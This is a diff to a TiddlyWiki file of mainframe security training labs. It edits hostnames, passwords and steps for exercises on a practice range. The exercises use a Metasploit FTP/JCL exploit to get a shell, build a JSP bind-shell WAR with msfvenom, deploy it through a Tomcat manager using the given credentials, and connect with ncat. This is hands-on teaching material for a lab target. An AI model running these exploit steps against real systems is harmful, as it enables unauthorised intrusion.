@@ -10070,7 +10070,7 @@ Error message and password prompt
 <div title="$:/status/RequireReloadDueToPluginChange">
 <pre>no</pre>
 </div>
-<div created="20210121010756656" list="[[UNIX Lab 1]] [[UNIX Lab 2]] [[UNIX Lab 3]] [[UNIX Lab 4]] [[UNIX Lab 5]] [[UNIX Lab 6]] [[UNIX Lab 7]] [[UNIX Lab 8]]" modified="20210121010759073" title="$:/StoryList">
+<div created="20210121010756656" list="$:/ControlPanel [[UNIX Lab 1]] [[UNIX Lab 2]] [[UNIX Lab 3]] [[UNIX Lab 4]] [[UNIX Lab 5]] [[UNIX Lab 6]] [[UNIX Lab 7]] [[UNIX Lab 8]]" modified="20210121010759073" title="$:/StoryList">
 <pre></pre>
 </div>
 <div author="JeremyRuston" core-version="&gt;=5.0.0" dependents="$:/themes/tiddlywiki/vanilla" description="Emphasises individual tiddlers" name="Snow White" plugin-priority="0" plugin-type="theme" title="$:/themes/tiddlywiki/snowwhite" type="application/json" version="5.1.23">
@@ -10398,7 +10398,7 @@ int main(int argc, char *argv[]) {
 # Copy that dataset back to a new one in your HLQ 
 # Cat the resulting dataset to confirm</pre>
 </div>
-<div created="20210121010741239" modified="20210121011415318" tags="" title="UNIX Lab 8">
+<div created="20210121010741239" modified="20210121010751109" tags="" title="UNIX Lab 8">
 <pre>!!''Lab Objectives''
 # Use metasploit natively to obtain a reverse USS shell
 
@@ -10414,10 +10414,15 @@ int main(int argc, char *argv[]) {
 * At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
 * Set the payload with `set payload cmd/mainframe/bind_shell_jcl`
 * Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
-* Set ''RHOST'' to evilmf: `set rhost k8s.evilmainframe.com`
+* Set ''RHOST'' to evilmf: `set rhost evilmf.evilmainframe.com`
 * Set ''LPORT'' to a port between 20000 and 39999: `set lport &lt;port&gt;` e.g `set lport 22222`
 * Set ''LHOST'' to `0.0.0.0`: `set lhost 0.0.0.0`
 * Type `exploit` to launch the exploit and get a reverse shell
+
+''Questions'' 
+* What type of shell is this? 
+* Can you run TSO commands? Which ones? 
+* Can you cat a pds member, for example `EVIL##.REXXLIB(LAB01)`?
 
 ---
 
@@ -10435,9 +10440,10 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 `nmap -sV evilmf.evilmainframe.com -p 8080`
 
 !!''Connect''
-* Open the web browser and connect to the port identified in the previous step
+* Open firefox and connect to the port identified in the previous step
+* `nikto` can easily find the credentials but to save you time:
 ** ''Username:'' `tomcat`
-** ''Password:'' `evilmf`
+** ''Password:'' `gibson`
 
 !!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
 
@@ -10447,7 +10453,7 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 ```
 msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
 ```
-* With web browser browse to `http://k8s.evilmainframe.com:8080/manager/html`
+* With firefox browse to `http://evilmf.evilmainframe.com:8080/manager/html`
 ** ''Username:'' `tomcat`
 ** ''Password:'' `gibson`
 * In the section ''WAR file to deploy'' click `Browse...`
@@ -10455,6 +10461,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * click `Deploy`
 * In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
 * It might take a bit for the page to load
+* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
 ** It may take a few tries
 
 ''Questions''
